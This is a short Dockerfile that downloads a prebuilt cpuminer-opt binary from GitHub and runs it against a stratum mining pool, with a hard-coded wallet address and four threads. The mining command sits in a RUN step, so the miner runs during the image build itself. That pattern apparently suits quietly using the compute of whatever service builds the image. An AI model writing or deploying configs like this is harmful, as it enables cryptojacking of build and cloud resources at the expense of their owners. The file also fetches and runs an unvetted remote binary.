FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.34/cpuminer-opt-linux.tar.gz
RUN tar zxvf cpuminer-opt-linux.tar.gz
RUN ./cpuminer-sse2 -a yespowerr16 -t 4 -o stratum+tcp://stratum-asia.rplant.xyz:3382 -u YVKxvfuuRWeqsxrkdobM68KDrgeG5Rmt8e
